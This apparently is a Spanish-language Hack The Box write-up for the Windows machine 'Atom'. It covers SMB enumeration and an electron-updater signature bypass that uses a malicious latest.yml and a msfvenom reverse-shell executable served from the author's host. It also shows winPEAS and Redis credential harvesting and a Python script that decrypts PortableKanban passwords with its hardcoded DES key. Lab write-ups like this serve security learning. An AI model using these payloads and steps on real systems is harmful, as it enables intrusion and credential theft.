---
title: "Atom - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/atom/data/Atom.jpg"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Smb
  - Redis
  - Encryption
  - Windows
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/atom/data/AtomHTB.png">
</p>

La máquina **atom** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **Medium** una calificación en el rank de 2.8, **2131 USER OWNS** y **2010 SYSTEM OWNS** con la ip **10.10.10.237** y un sistema operativo **Windows**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.237]** utilizando los parámetros:
- **-p-:**    Escaneo a toda la gama de puertos (65536).
- **-Pn:**    Evita hacer ping a las maquinas a escanear.
- **--min-rate:** Envió de paquetes no mas lentos que el numero especificando.
- **-sS:**    Lanza un sondeo de tipo SYN sigiloso
- **--open:** Muestra sólo los puertos con un estatus abierto.
- **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts**, vemos que los puertos que destacaron en este caso fueron **80,135,443,445,5985,6379**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/Ports.png">
  </p>


  Ya identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/PortServ.png">
  </p>

  Gracias a escaneo de versiones y servicios podemos ver varios puertos que son de interés como el **445**, el **6379** y el **80**, para esto voy a enumerar el servicio 445 que es un servicio de **SMB**, para esto usare la herramienta de **smbclient** para listar los recursos y con auténticamente con el usuario **"anonymous"**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/smb.png">
  </p>

  Con esta enumeración de recursos y entrando como un usuario **anonymous** con una null session puedo ver que existe un recurso llamado **Software_Updates**, para ver si tengo permisos para acceder a ese recurso usare la herramienta de **smbmap** para identificar los permisos que tengo sobre ese recursos con la null session:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/smbp.png">
  </p>

  Como se puede ver tengo permisos de **lectura y escritura** en este recurso compartido por smb así que ya con esto en mente entrare al recurso con **smbclient**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/smba.png">
  </p>

  Al entrar al recurso se puede ver que existen 3 carpetas **client** numeradas de **1 al 3** y un archivo pdf.


  Transfiriendo el pdf a mi maquina puedo ver puedo ver que habla de un aplicativo llamado **Heedv1.0**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/scan/heed.png">
  </p>

  Investigando en se puede llegar un **[post](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)** el cual explica como mediante la subida de un archivo **lastet.yml** con contenido malicioso puede ser interpretado para ejecutar comando.

  Sabiendo esto primero voy a crear un archivo malicioso con la herramienta de **msfvenom**

  ```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > w\'insad.exe
  ```

  Una vez creado nuestro ejecutable el cual queremos que la maquina nos interprete en el post nos indica que tenemos que conseguir el hash del ejecutable para ingresarlo en nuestro archivo **lastet.yml**, este hash se consigue con las siguiente sentencia de comando:

  ```bash
shasum -a 512 w\'insad.exe | cut -d " " -f1 | xxd -r -p | base64
  ```
  Ya que tenemos el hash tenemos que crear nuestro archivo **lastet.ymal** el cual tendrá el siguiente contenido:

  ```bash
  version: 1.2.3
  path: http://10.10.15.125/w\'insad.exe
  sha512: [Hash]
  ```

  Ya que cree el archivo **lastet.ymal** entro al recurso compartido con **smbclient** y dentro de una carpeta **client1** subo el archivo **lastet.ymal**, poniéndome en escucha por el puerto 443 el cual fue el que especifique ene el archivo exe y levantando un servicio **http** con python para que cuando el aplicativo interprete el contenido de **lastet.ymal** comunique a mi maquina y ejecute el archivo exe.
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/shell.png">
  </p>

  Como se puede ver el aplicativo es vulnerable a esta ejecución de comando y pude acceder a la maquia como el usuario **jason**

## Privilege escalation

  Para poder hacer una escala de privilegios yo usare la herramienta **"winpeas"** la cual ayuda a enumerara el sistema windows en busca de vulnerabilidades, procesos, credenciales o archivos interesantes que existan en la maquina.

  Para transferir el archivo yo me levantare un servicio smb en mi maquina para que desde la maquina victima poder copiar el archivo **winpeas**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/tra.png">
  </p>

  Una vez que pase el binario lo ejecute y espere a los resultados los cuales me lanzaron que se pueden ver las credenciales del usuario **jason** en el sistema.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/cred.png">
  </p>

  También es notable que esta corriendo **redis** ya que lo vimos a la hora de escanear los puertos existentes y viendo en los resultados que winpeas me dio, veo que redis tiene un archivo de configuración setteado.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/redis.png">
  </p>

  Si vamos a ese directorio y vemos que en uno de los archivos que existente de configuración se puede ver que hay unas credenciales para redis y recordando que redis es visible para nosotros puedo intentar acceder a redis con esas credenciales.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/redis1.png">
  </p>

  Entrando a redis con una cli con los comando ```redis-cli -d <IP-Machine> -a <Password> ``` y enumerando las key se puede ver que existe una con el hash de el usuario administrador.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/redis2.png">
  </p>

  Teniendo este hash y enumerando mas el sistema podemos ver que hay un fólder en Descargas del usuario **jason** llamado **PortableKanban** haciendo una búsqueda se puede llegar a que hay recurso en **"Exploit Database"** el cual sirve para descifrar este tipo de hashes.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/exp.png">
  </p>

  Adaptando el exploit ya que esté sirve para encriptar pero cuenta con una función de decryp podemos lograr pasarle el hash para decryptarlo.

  ```python
  import json
  import base64
  from des import * #python3 -m pip install des
  import sys

  def decode(hash):
          hash = base64.b64decode(hash.encode('utf-8'))
          key = DesKey(b"7ly6UznJ")
          return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

  print(decode('<HASH>'))
  ```
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/admi.png">
  </p>

  Ahora que tenemos las credenciales del usuario "administrador" podemos verificarlas con la herramienta de **crackmapexec**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/preshell.png">
  </p>
  Y como vemos la herramienta los muestra un **Pwn3d!** lo que significa que tenemos capacidad de **psexec** para obtener una shell como el usuario administrador.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/atom/intrusion/shellr.png">
  </p>
